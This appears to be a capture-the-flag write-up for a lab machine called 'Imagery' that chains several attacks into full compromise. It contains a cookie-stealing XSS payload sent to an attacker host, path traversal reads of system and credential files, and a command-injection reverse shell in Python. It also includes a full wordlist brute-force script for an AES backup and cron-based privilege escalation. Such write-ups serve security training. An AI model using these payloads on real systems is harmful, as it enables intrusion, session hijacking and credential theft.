---
layout: post
title: "Imagery"
date: 2025-10-05
---

## Challenge Description
This was a cool Machine to pwn, a little bit more difficult compared to others.

## Solution
As always lets start by gathering some information.

```
nmap 10.10.11.88

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 15:25 CEST
Nmap scan report for 10.10.11.88
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

```
whatweb http://10.10.11.88:8000

http://10.10.11.88:8000 [200 OK] Country[RESERVED][ZZ], Email[support@imagery.com], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.12.7], IP[10.10.11.88], Python[3.12.7], Script, Title[Image Gallery], Werkzeug[3.1.3]
```


`<img src=1 onerror="document.location='http://<YOUR_IP>:<PORT>/?c='+document.cookie">`

`python3 -m http.server 4444`

```
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.11.88 - - [07/Oct/2025 16:40:11] "GET /?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOUmSA.jdy03TUVCuTTMbKvHqPHLpGyDzo HTTP/1.1" 200 -
10.10.11.88 - - [07/Oct/2025 16:40:12] code 404, message File not found
10.10.11.88 - - [07/Oct/2025 16:40:12] "GET /favicon.ico HTTP/1.1" 404 -

0.10.11.88 - - [07/Oct/2025 16:41:11] "GET /?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOUmhA.e4etD86D1420qhy8E-mbOz7Frvc HTTP/1.1" 200 -
10.10.11.88 - - [07/Oct/2025 16:41:12] code 404, message File not found
10.10.11.88 - - [07/Oct/2025 16:41:12] "GET /favicon.ico HTTP/1.1" 404 -
```

```
curl -s -H "session: .eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOUmhA.e4etD86D1420qhy8E-mbOz7Frvc" "http://10.10.11.88:8000/" -o admin.html

grep -iE "admin|/api/|report|logs|backup|download|users|user|reset|password|upload|backup|git|.env" -n *.js admin.html || true
```

If we take a look carefully at the output file we can spot these lines:

```
admin_root.html:2342:                const response = await fetch(`${window.location.origin}/admin/bug_reports`);

admin_root.html:2391:                const response = await fetch(`${window.location.origin}/admin/delete_bug_report`, {

admin_root.html:2452:            window.location.href = `/admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log`;

admin_root.html:2467:                const response = await fetch(`${window.location.origin}/admin/delete_user`, {

admin_root.html:2508:                const response = await fetch(`${window.location.origin}/admin/users`);

```

That hint us to these endpoints here:

```
/admin/users
/admin/get_system_log?log_identifier=
/admin/bug_reports
/admin/delete_bug_report
/admin/delete_user
```

```
{"anyAdminExists":true,"success":true,"users":[
{"displayId":"a1b2c3d4","isAdmin":true,"isTestuser":false,"username":"admin@imagery.htb"},
{"displayId":"e5f6g7h8","isAdmin":false,"isTestuser":true,"username":"testuser@imagery.htb"},
{"displayId":"a4ffb3c9","isAdmin":false,"isTestuser":false,"username":"leon4rd@gmail.com"}
]}
```

If we go to this endpoint `/admin/get_system_log?log_identifier=` and we add the username of each user we are able to download the logs.

This is the content for the `.log` of testuser:

```
[2025-10-07T15:14:01.822705] Logged in successfully.
[2025-10-07T15:15:30.715622] Uploaded image: cat-2068462_1280.jpg (ID: 7ba66c34-0bba-4b67-b58a-3c55821b5324) to group 'My Images'.
[2025-10-07T15:15:56.696460] Uploaded image: oldKaliWP.jpg (ID: 4c3028bb-e3df-48a4-8930-3b62c15e102f) to group 'My Images'.
```

Ok throught the `get_system_log` we are able to move between directories and retrive different files like `/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
web:x:1001:1001::/home/web:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mark:x:1002:1002::/home/mark:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
dhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

```
http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../../etc/group

root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:999:
systemd-network:x:998:
systemd-timesync:x:997:
lxd:x:101:
messagebus:x:102:
input:x:996:
sgx:x:995:
kvm:x:994:
render:x:993:
systemd-resolve:x:992:
_ssh:x:103:
polkitd:x:991:
crontab:x:990:
syslog:x:104:
uuidd:x:105:
rdma:x:106:
tcpdump:x:107:
tss:x:108:
landscape:x:109:
fwupd-refresh:x:989:
web:x:1001:
snapd-range-524288-root:x:524288:
snap_daemon:x:584788:
netdev:x:110:
mark:x:1002:
_laurel:x:988:
```

```
http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../../etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
```

```
http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../../home/web/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsJc1hj25ugA/Z0hG2HLTXI20SN7+ylT3l2qdqlqB4ilOoHRObjrO0wlPdBaag27Nr7IYRkgEBbhHadMYnnOukLWbrdtZFeREyr3fnZJwtP4GjqkmHV0u4LGDvBQfw+MJ/cIgCScndUbSu0hiKxzyAILaY99RMnqhWpwtVYW20Ee5ORCrSzNYU4hsLUKLZriPLQs2OHEbApy/wKpmPHoW+Mc7IC0/EGCZ7QxknqpD/+XMM6hp/DkymNhOGnLw8PH/P98FTzcSDrgGzORTj2+XFd5LOUXPLU+faC4jCmPyfNEbJqkVsFZu6MwfrtI0UFvNkOituMeRR3DB527PaZBGAppKuulwyI6LnjrEL1hFYXe9nw11/q3ElB18OUaFSt7SITNkInumbzCqy6MzwzcQhmEOVt0G7dbtDx3U9CkcKNz1PSi5OZJ851fOC0plVBoL4sn67ce4mpuSzi97UhnpgEGf55rD6PlPfes8xsxNOqD/QMxHWalQ0A2Z0yvgCzRk= spades@MSI
```

If we point to `/etc/shadow` we got this error

`"Error reading file: [Errno 13] Permission denied: '/home/web/web/system_logs/../../../../../../etc/shadow'"`

So lets try to escape only one directory maybe we can find the `config.py` since we know that python its running on the background thanks to `whatweb`.

```
http://10.10.11.88:8000/admin/get_system_log?log_identifier=../config.py

import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)
os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)

MAX_LOGIN_ATTEMPTS = 10
ACCOUNT_LOCKOUT_DURATION_MINS = 1

ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}
ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}
ALLOWED_UPLOAD_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff',
    'application/pdf'
}
ALLOWED_TRANSFORM_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff'
}
MAX_FILE_SIZE_MB = 1
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024

BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}
BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
PRIVATE_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('172.0.0.0/12'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16')
]
AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
EXIFTOOL_PATH = '/usr/bin/exiftool'
```

```
http://10.10.11.88:8000/admin/get_system_log?log_identifier=../app.py

from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False

app_core.register_blueprint(bp_auth)
app_core.register_blueprint(bp_upload)
app_core.register_blueprint(bp_manage)
app_core.register_blueprint(bp_edit)
app_core.register_blueprint(bp_admin)
app_core.register_blueprint(bp_misc)

@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
    for collection_to_add in default_collections:
        if collection_to_add not in existing_collection_names_in_database:
            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
    _save_data(current_database_data)
    for user_entry in current_database_data.get('users', []):
        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f"{user_entry['username']}.log")
        if not os.path.exists(user_log_file_path):
            with open(user_log_file_path, 'w') as f:
                f.write(f"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n")
    port = int(os.environ.get("PORT", 8000))
    if port in BLOCKED_APP_PORTS:
        print(f"Port {port} is blocked for security reasons. Please choose another port.")
        sys.exit(1)
    app_core.run(debug=False, host='0.0.0.0', port=port)
```

Nice! We retrived usefull files. In fact if we look at the `config.py` we can notice the existance of `db.json`, apparently on the same directory.
Lets fetch it and take a look at the content.

```
http://10.10.11.88:8000/admin/get_system_log?log_identifier=../db.json

{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": []
}
```

```
testuser@imagery.htb
2c65c8d7bfbca32a3ed42596192384f6:iambatman
```

Nice! We retrived the password, now lets try to enstablish an ssh connection! Something its not working so lets continue on the web application!

When uploading an image and selecting the Transformation options we managed to capture this request through Burpsuite:

`{"imageId":"2b6d6a06-6d71-4b41-ab1e-713d6300c52f","transformType":"crop","params":{"x":0,"y":0,"width":520,"height":74}}`

Lets insert the payload in the `y` parameter:

`"0; python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<attacker_ip>\",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"`

Once inside in the backup folder there is this file

`web_20250806_120723.zip.aes`

I downloaded on my local machine and used `pyAesCrypt` to decrypt it, since if we cat the file we can see a string hinting to that tool.

When decrypting it, I have been asked for a password, so lets brute force it with the use of the rockyou dictionary.

I used a script i made to bruteforce the password that was protecting the backup.

'''

#!/usr/bin/env python3
import os
import sys
import argparse
import gzip
from concurrent.futures import ProcessPoolExecutor, as_completed
import pyAesCrypt

BUFFER_SIZE = 64 * 1024  #pyAesCrypt default

def open_wordlist(path):
    if path.endswith(".gz"):
        return gzip.open(path, "rt", errors="ignore")
    return open(path, "r", errors="ignore")

def try_password(enc_path, pwd, bufferSize):
    try:
        file_size = os.path.getsize(enc_path)
        with open(enc_path, "rb") as fin, open(os.devnull, "wb") as fout:
            pyAesCrypt.decryptStream(fin, fout, pwd, bufferSize, file_size)
        return True
    except Exception:
        return False

def password_generator(wordlist_path, max_try=None):
    with open_wordlist(wordlist_path) as f:
        for i, line in enumerate(f, 1):
            if max_try and i > max_try:
                break
            pw = line.rstrip("\n\r")
            if pw:
                yield pw

def main():
    p = argparse.ArgumentParser()
    p.add_argument("enc_file", help="Encrypted .aes file")
    p.add_argument("wordlist", help="Wordlist file (plain or .gz)")
    p.add_argument("--workers", "-w", type=int, default=4, help="Parallel workers (default 4)")
    p.add_argument("--max", "-m", type=int, default=None, help="Max passwords to try (for quick tests)")
    p.add_argument("--buffer", type=int, default=BUFFER_SIZE, help="pyAesCrypt buffer size (bytes)")
    args = p.parse_args()

    if not os.path.isfile(args.enc_file):
        print("Encrypted file not found:", args.enc_file); sys.exit(2)
    if not os.path.isfile(args.wordlist):
        print("Wordlist not found:", args.wordlist); sys.exit(2)

    gen = password_generator(args.wordlist, max_try=args.max)
    print(f"[i] enc_file={args.enc_file}, wordlist={args.wordlist}, workers={args.workers}, max={args.max or 'ALL'}")

    found = False
    found_pwd = None

    with ProcessPoolExecutor(max_workers=args.workers) as exe:
        futures = {}
        WINDOW = args.workers * 2

        try:
            # submit initial window
            for _ in range(WINDOW):
                try:
                    pw = next(gen)
                except StopIteration:
                    break
                fut = exe.submit(try_password, args.enc_file, pw, args.buffer)
                futures[fut] = pw

            # process futures and keep refilling
            while futures:
                for fut in as_completed(list(futures.keys()), timeout=None):
                    pw = futures.pop(fut)
                    success = fut.result()
                    if success:
                        found = True
                        found_pwd = pw
                        break
                    # refill one new task if available
                    try:
                        next_pw = next(gen)
                        newf = exe.submit(try_password, args.enc_file, next_pw, args.buffer)
                        futures[newf] = next_pw
                    except StopIteration:
                        pass
                if found:
                    break

        except KeyboardInterrupt:
            print("\n[-] Interrupted by user, shutting down...")
            exe.shutdown(wait=False, cancel_futures=True)
            sys.exit(1)

    if found:
        print(f"[+] PASSWORD FOUND: {found_pwd}")
        sys.exit(0)
    else:
        print("[-] No password found (within provided wordlist / --max limit).")
        sys.exit(1)

if __name__ == "__main__":
    main()

'''

`bestfriends`

Lets unzip it and take a look at the content. Since its a backup lets take a look at the `db.json` file, where we previously found the password of `testuser`.

```
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}
```

If we try to resolve the hash of mark, we are able to retrive the password

`supersmash`

Now lets switch to `mark`. From the shell we previusly runned:

`su - mark`

Password: `supersmash`

```
mark@Imagery:~$ cat user.txt    

3fd2de6d552b1bc43d13b9422887fe40
```

And we managed to retrive the user flag!

```
sudo -l

Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

In the list of files from `find / -group 1002 -type f 2>/dev/null` there is this one:

`/tmp/crontab.b0tDwi/.crontab.swp`

So it has to do something related to crono jobs. Lets try to run:

`sudo charcol`

Ok nice! I think we can use it to add new crono jobs to execute. We can use something like this:

```
sudo charcol shell

auto add --schedule "* * * * *" --command "cat /root/root.txt > /home/.flag" --name "root_flag" --log-output /home/.flag
```

We can also do another command that push user `mark` to root privilage and manually access `/root` and print `root.txt`.

And we got the root flag!

`c5269e8fe01ff434761f5753d1a47c08`